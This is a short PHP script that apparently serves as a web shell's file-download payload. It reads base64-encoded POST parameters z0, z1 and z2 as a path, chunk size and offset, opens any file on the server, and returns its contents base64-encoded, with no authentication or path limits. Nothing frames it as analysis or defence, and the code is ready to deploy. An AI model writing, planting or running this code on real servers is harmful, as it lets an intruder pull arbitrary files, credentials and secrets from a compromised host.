<?php

$szPath = base64_decode($_POST['z0']);
$szChunkSize = base64_decode($_POST['z1']);
$szOffset = base64_decode($_POST['z2']);

$nChunkSize = (int)$szChunkSize;
$nOffset = (int)$szOffset;

if (!file_exists($szPath)) {
    die("0|ERROR://".$szPath." not existed!");
}

$nFileSize = filesize($szPath);

if ($nOffset >= $nFileSize) {
    die("2|");
}

$handle = fopen($szPath, "rb");
if ($handle === false) {
    die("0|ERROR://Cannot open: ".$szPath);
}

if (fseek($handle, $nOffset, SEEK_SET) !== 0) {
    fclose($handle);
    die("0|ERROR://Cannot seek to: ".$nOffset);
}

$remaining = $nFileSize - $nOffset;
$readSize = min($nChunkSize, $remaining);

$data = '';
$readTotal = 0;

while ($readTotal < $readSize && !feof($handle)) {
    $buffer = fread($handle, $readSize - $readTotal);

    if ($buffer === false) {
        fclose($handle);
        die("0|ERROR://Read failed");
    }

    if ($buffer === '') {
        break;
    }

    $data .= $buffer;
    $readTotal += strlen($buffer);
}

fclose($handle);

echo "1|" . base64_encode($data);

?>